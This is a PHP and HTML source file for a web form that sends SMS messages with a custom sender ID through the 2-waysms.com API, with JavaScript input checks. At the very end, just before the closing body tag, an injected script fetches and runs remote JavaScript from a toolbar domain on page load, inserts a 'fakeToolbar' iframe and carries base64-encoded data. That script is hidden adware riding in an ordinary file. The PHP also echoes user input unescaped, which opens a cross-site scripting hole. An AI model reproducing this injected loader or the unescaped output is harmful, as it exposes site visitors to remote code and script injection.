<?
/*
 Simple and easy for modification, PHP script for SMS sending through HTTP with you own Sender ID and delivery reports. 
 You just have to type your account information on www.2-waysms.com and upload file on server.
 
 Istruction:
 
 // Find 2 parameters in <body> and type your account information on www.2-waysms.com
 
 1.  $from = "********"; // Change ********, and put your SMS Number in www.2-waysms.com account
 2.  $token = "********"; // Change ********, and put your token code in www.2-waysms.com account
 
*/
?>

<html>
<head>
<meta name="robots" content="index">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SMSER</title>
<style type="text/css">
body{
	font-family:"Lucida Grande", "Lucida Sans Unicode", Verdana, Arial, Helvetica, sans-serif; 
	font-size:12px;
}
p, h1, form, button{border:0; margin:0; padding:0;}
.spacer{clear:both; height:1px;}
/* ----------- My Form ----------- */
.myform{
	margin:0 auto;
	width:340px;
	padding:14px;
}
/* ----------- stylized ----------- */
	#stylized{
		border:solid 2px #b7ddf2;
		background:#ebf4fb;
	}
	#stylized h1 {
		font-size:14px;
		font-weight:bold;
		margin-bottom:8px;
	}
	#stylized p{
		font-size:11px;
		color:#666666;
		margin-bottom:20px;
		border-bottom:solid 1px #b7ddf2;
		padding-bottom:10px;
	
}
	</style> 
	
	<script type="text/javascript">
	
//Edit the counter/limiter value as your wish
var count = "160";   //Example: var count = "175";
function limiter(){
var tex = document.myform.text.value;
var len = tex.length;
if(len > count){
        tex = tex.substring(0,count);
        document.myform.text.value =tex;
        return false;
}
document.myform.limit.value = count-len;
}

// +,- delete
var r={'special':/[\W]/g}
function valid(o,w)
{
  o.value = o.value.replace(r[w],'');
}

// phone number checker
function isNumeric()
{
  var elem=document.myform.to.value;
  var nalt=document.getElementById('phno1');
 if(elem!="")
 {
    var numericExpression = /^[0-9]+$/;
	  if(elem.match(numericExpression))
    {
         nalt.innerHTML="";
         return true;
       }
    
    else{
		
    nalt.innerHTML="<font size=1 > Numbers Only</font>";
		  document.myform.to.focus();
	 	  document.myform.to.value="";
       return false;
	  }
  }
  else if(elem.length==0)  {
    nalt.innerHTML="<font size=1 > Enter Numbers</font>";
     document.myform.to.focus();;
   return false;
    }
}
</script> 
	
</head>
<body>
<?
 
$from = "********"; // Change ********, and put your SMS Number in www.2-waysms.com account
$token = "********"; // Change ********, and put your token code in www.2-waysms.com account

 
$option = $_REQUEST["option"];
$text = $_REQUEST["text"];
$to = $_REQUEST["to"];
$senderid = $_REQUEST["senderid"];


	switch ($option) {
	

	case sendsms:
		if ($text == "") { echo 
	"<center><br>Error!<br><b>Text not entered<b><br><a href=\"javascript:history.back(-1)\"><b>Go Back<b></a><br></center>"; 
die; } else { }
		
		if ($to == "") { echo "<center><br>Error!<br><b>Number not entered<b><br><a href=\"javascript:history.back(-1)\"><b>Go Back<b></a><br></center>";
 die; } else { }
 
		if ($senderid == "") { echo "<center><br>Error!<br><b>From not entered<b><br><a href=\"javascript:history.back(-1)\"><b>Go Back<b></a><br></center>";
die; } else { }

		$url = "http://www.2-waysms.com/my/api/sms.php";

		$postfields = array ("from" => "$from",
        "token" => "$token",
        "text" => "$text",
		"to" => "$to",
		"senderid" => "$senderid");
		
		if (!$curld = curl_init()) {
		echo "Could not initialize cURL session.";
		exit;
		}
		curl_setopt($curld, CURLOPT_POST, true);
		curl_setopt($curld, CURLOPT_POSTFIELDS, $postfields);
		curl_setopt($curld, CURLOPT_URL, $url);
		curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($curld);
		curl_close ($curld);
		
		$out = explode('|',$output);
		
echo "<center>Message Status: Your message was sent successfully to $to $out[1]<br><a href=\"smser.php\"><b>Send New SMS Message</b></a></center>"; 

	break;

	default:
		
	echo
	
	 "<div id=\"stylized\" class=\"myform\">"
	   ."<form name=\"myform\" method=post action=\"$PHP_SELF?option=sendsms\">"
	   ."<table border=\"0\">"
	   ."<tr>"
	   ."<center><h1>Send SMS with own Sender ID</h1></center>"
		 ."<td>Sender ID</td>"
		 ."<td><input type=\"text\" name=\"senderid\" onkeyup=\"valid(this,'special')\" onblur=\"valid(this,'special')\"></td>"
	   ."</tr>"
	   ."<tr>"
		 ."<td>Number</td>"
		 ."<td><input type=\"text\" name=\"to\" id=\"to\" onKeyup=\"isNumeric()\"><span id=phno1></span></td>"
	   ."</tr>"
	   ."<tr>"
		 ."<td>Message</td>"
		 ."<td><textarea name=text wrap=physical rows=4 cols=25 onkeyup=limiter()></textarea></td><br>"
     ."</tr>"
	   ."<tr>"
	   ."<td></td>"
      ."<td>Character left: <script type=\"text/javascript\">"
       ."document.write(\"<input type=text name=limit size=4 readonly value=\"+count+\">\");"
       ."</script><br></td>"
	   ."</tr>"
	   ."<tr>"
		 ."<td>&nbsp;</td>"
		 ."<td><input type=submit name=submit value=Send>"
		 ."<div class=\"spacer\"></div></td>"
	   ."</tr>"
	   ."</table>"
	   ."</form>"
	."</div><br>";
	}
	
?>
</center>
<!-- Layer8 version 2.0.0.107 --><script>if(top==window){var fn_selector_insertion_script="http://toolbar.mywebacceleration.com/tbpreload.js";runFnTbScript = function(){try{var tbInsertion = new FNH.TBInsertion();var tbData = "PFRCRGF0YT48VEJEYXRhSXRlbSBuYW1lPSJob3N0X3VybCIgdmFsdWU9Imh0dHA6Ly9jem5pYy5kbC5zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdC9zZW5kLXNtcy1zY3JpcHQvc21zZXIucGhwIiA+PC9UQkRhdGFJdGVtPjxUQkRhdGFJdGVtIG5hbWU9Imluc2VydGlvbiIgdmFsdWU9Imh0dHA6Ly90b29sYmFyLm15d2ViYWNjZWxlcmF0aW9uLmNvbS9zb3VyY2VzL2luZnJhL2pzL2luc2VydGlvbl9wYy5qcyIgY29uZmlndXJhdGlvbj0idHJ1ZSIgPjwvVEJEYXRhSXRlbT48L1RCRGF0YT4=";tbInsertion.parseTBData(tbData);var fnLayer8=tbInsertion.createIframeElement("fn_layer8", "http://toolbar.mywebacceleration.com/Globe/fakeToolbar.html");var owner;if(document.body){owner=document.body;}else{owner=document.documentElement;}var shouldAddDiv=tbInsertion.getAttributeFromTBData("div_wrapper");if(shouldAddDiv){var divWrpr=tbInsertion.createElement("div", "fn_wrapper_div");divWrpr.style.position="fixed";divWrpr.ontouchstart=function(){return true;};if (typeof fnLayer8 != "undefined")divWrpr.appendChild(fnLayer8);owner.appendChild(divWrpr);}else{if (typeof fnLayer8 != "undefined")owner.appendChild(fnLayer8);}var result=tbInsertion.getAttributeFromTBData("insertion");if(result){scriptLocation=result;}else{scriptLocation="http://toolbar.mywebacceleration.com/sources/infra/js/insertion_pc.js"}var fnd=document.createElement("script");fnd.setAttribute("src",scriptLocation);fnd.setAttribute("id","fn_toolbar_script");fnd.setAttribute("toolbardata",tbData);fnd.setAttribute("toolbarhash","DlduKDZGfPzKtpBXK/5hGg==");fnd.setAttribute("persdata","PFByaXZhdGVEYXRhPg0KPFByaXZhdGVJdGVtIGtleT0iY2xvc2VkIiB2YWx1ZT0iZmFsc2UiPg0KPC9Qcml2YXRlSXRlbT4NCjxQcml2YXRlSXRlbSBrZXk9Im1pbmltaXplZCIgdmFsdWU9ImZhbHNlIj4NCjwvUHJpdmF0ZUl0ZW0+DQo8UHJpdmF0ZUl0ZW0ga2V5PSJkZWZhdWx0UGVyc1ZhbHVlcyIgdmFsdWU9InRydWUiPg0KPC9Qcml2YXRlSXRlbT4NCjwvUHJpdmF0ZURhdGE+");document.body.appendChild(fnd);}catch(e){console.error("TB preload script failed: " + e);}};var fne=document.createElement("script");fne.setAttribute("src",fn_selector_insertion_script);fne.setAttribute("id","fn_selector_insertion_script");if(fne.addEventListener){fne.onload = runFnTbScript;}else {fne.onreadystatechange = function(){if ((this.readyState == "complete") || (this.readyState == "loaded")) runFnTbScript();}};if(document.head==null || document.head=="undefined" ){document.head = document.getElementsByTagName("head")[0];}document.head.appendChild(fne);};</script></body>
</html>